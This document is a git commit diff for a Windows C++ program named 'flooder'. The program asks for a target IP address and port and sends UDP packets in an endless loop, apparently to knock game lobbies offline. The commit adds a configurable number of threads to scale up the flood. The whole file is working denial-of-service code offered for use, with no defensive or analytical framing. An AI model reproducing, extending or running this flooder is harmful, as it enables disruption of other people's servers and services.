73462639c0cd31fad48c2d0015db43c41811097b
Mateus Ferraz <108159617+Matt-Ferraz@users.noreply.github.com>
2024-08-11 13:30:48 -0300

    add threads

--- flooder/Main.cpp
+++ flooder/Main.cpp
@@ -1,26 +1,25 @@
 #include <iostream>
 #include <winsock2.h>
+#include <thread>
+#include <vector>
 using namespace std;
 
 #pragma comment(lib,"ws2_32.lib") 
 #pragma warning(disable:4996) 
-#define BUFLEN 512  
-
-char ip_address[16] = "";
-int port = NULL;
+#define BUFLEN 256  
 
 class UDPClient {
 public:
-    UDPClient() 
+    UDPClient(const char* ip, int port)
     {
-        if (WSAStartup(MAKEWORD(2, 2), &ws) != 0) 
+        if (WSAStartup(MAKEWORD(2, 2), &ws) != 0)
         {
             cout << "Failed. Error Code: " << WSAGetLastError() << "\n";
             exit(EXIT_FAILURE);
         }
         cout << "Initialized.\n";
 
-        if ((client_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == SOCKET_ERROR) 
+        if ((client_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == SOCKET_ERROR)
         {
             cout << "socket() failed with error code: " << WSAGetLastError() << "\n";
             exit(EXIT_FAILURE);
@@ -29,7 +28,7 @@ public:
         memset((char*)&server, 0, sizeof(server));
         server.sin_family = AF_INET;
         server.sin_port = htons(port);
-        server.sin_addr.S_un.S_addr = inet_addr(ip_address);
+        server.sin_addr.S_un.S_addr = inet_addr(ip);
     }
 
     ~UDPClient() {
@@ -37,14 +36,13 @@ public:
         WSACleanup();
     }
 
-    void start() 
+    void start()
     {
         const char* message = "theres cheaters on lobby ;(!";
-        int i = 0;
 
-        while (true) 
+        while (true)
         {
-            if (sendto(client_socket, message, strlen(message), 0, (sockaddr*)&server, sizeof(sockaddr_in)) == SOCKET_ERROR) 
+            if (sendto(client_socket, message, strlen(message), 0, (sockaddr*)&server, sizeof(sockaddr_in)) == SOCKET_ERROR)
             {
                 cout << "sendto() failed with error code: " << WSAGetLastError() << "\n";
                 exit(EXIT_FAILURE);
@@ -58,19 +56,40 @@ private:
     sockaddr_in server;
 };
 
+void thread_task(const char* ip, int port)
+{
+    UDPClient udpClient(ip, port);
+    udpClient.start();
+}
+
 int main()
 {
-    cout << "ip address (ex: 000.00.00.00):";
-    cin >> ip_address;
-    cout << endl;
-    cout << "port:";
-    cin >> port;
-    cout << endl;
+    char ip_address[16] = "";
+    int port = NULL;
+    int num_threads = 1;
 
-    cout << "Initializing flood against " << ip_address << ":" << port << endl;
+    cout << "IP address (ex: 000.00.00.00): ";
+    cin >> ip_address;
+    cout << "Port: ";
+    cin >> port;
+    cout << "Number of threads: ";
+    cin >> num_threads;
+
+    cout << "Initializing flood against " << ip_address << ":" << port << " with " << num_threads << " threads.\n";
 
     MoveWindow(GetConsoleWindow(), 50, 50, 500, 500, true);
 
-    UDPClient udpClient;
-    udpClient.start();
+    vector<thread> threads;
+
+    for (int i = 0; i < num_threads; ++i)
+    {
+        threads.emplace_back(thread_task, ip_address, port);
+    }
+
+    for (auto& t : threads)
+    {
+        t.join();
+    }
+
+    return 0;
 }
